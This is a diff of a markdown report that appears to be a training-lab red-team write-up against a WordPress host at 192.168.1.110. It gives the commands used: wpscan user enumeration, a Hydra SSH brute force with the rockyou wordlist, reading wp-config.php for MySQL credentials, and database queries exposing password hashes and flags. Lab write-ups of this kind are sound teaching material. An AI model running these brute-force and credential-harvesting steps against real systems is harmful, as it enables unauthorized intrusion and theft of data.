@@ -72,7 +72,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   
     - **Exploit Used**
       - WPScan was used to enumerate users on the Wordpress site for Target 1
-      - wpscan --url 192.168.1.110/wordpress --enumerate vp,u
+      - **`wpscan --url 192.168.1.110/wordpress --enumerate vp,u`**
 
 ![Pen test - Kali WPS scan command](https://user-images.githubusercontent.com/88017838/153717305-6f93c63e-b549-4056-b2ce-85e0a36f9ae6.PNG)
 ![Pen test - Kali WPScan Users identified](https://user-images.githubusercontent.com/88017838/153717542-e785b810-839e-471f-9ee7-4b5890003b9e.PNG)
@@ -81,8 +81,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - Focusing on the user michael, I was able to run a Hydra brute force to quickly obtain his password, which as indicated below is a weak and easily crackable one
   - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh -t 4
   - Using michael's credentials we can then SSH into 192.168.1.110 and located flag1 by following below steps:
-  - cd /var/www/html
-  - ls -l
+  - **`cd /var/www/html`**
+  - **`ls -l`**
   - after investigating multiple files, the flag1 was located via nano services.html
       
 ![Pen test - Kali Hydra michael](https://user-images.githubusercontent.com/88017838/153717654-754970ea-af9a-4c40-8590-47abebbd7194.PNG)
@@ -91,14 +91,35 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`:{fc3fd58dcdad9ab23faca6e9a36e581c}
   
-    - **Exploit Used**
+   - **Exploit Used**
       - While still logged in as michael via SSH I was able to locate flag2 by following the below
-      - cd /var/www
-      - ls -l
-      - cat flag2.txt
+      - **`cd /var/www`**
+      - **`ls -l`**
+      - **`cat flag2.txt`**
 
 ![image](https://user-images.githubusercontent.com/88017838/153718231-699b0a91-8495-4810-923e-253e78175acc.png)
 
 
    - `flag3.txt`:{afc01ab56b50591e7dccf93122770cd2}
+   
+    = **Exploit Used**
+       - Locating the wp-config.php file
+       - cd /var/www/html/wordpress 
+       - cat wp-config.php revealed the username and password for MySQL database
+ 
+ ![Pen test - Kali wordpress wp-config php](https://user-images.githubusercontent.com/88017838/153732790-5ff99b27-2ed4-4702-9b26-3653a5056ecd.PNG)
+ 
+ ![Pen test - Kali wordpress wp-config php cont](https://user-images.githubusercontent.com/88017838/153732794-7e93eee8-8755-4a89-ab8a-c6c2b0d47edf.PNG)
+
+ - MySQL server:
+   - Using the command mysql -u root -p and the credentials found in wp-config.php we were able to gain access to the MySQL server
+   - The **`show databases;`** command reveals wordpress database which we can then access with **`use wordpress;`**
+   - **`show tables;`** then reveals two unsalted password hashes for users michael and steven
+   - **`select * from wp_posts;`** further investigation using this command reveals flag3
+ 
+ ![Pen test - Kali mysql michael ssh](https://user-images.githubusercontent.com/88017838/153732968-d29dcfed-9f99-4c7c-a60a-c783c1961818.PNG)
+
+ ![Pen test - Kali wp_posts user hashes](https://user-images.githubusercontent.com/88017838/153732974-8bdb86b1-9566-43fa-a6ac-8bb7eae7b6c1.PNG)
+
+ 
 
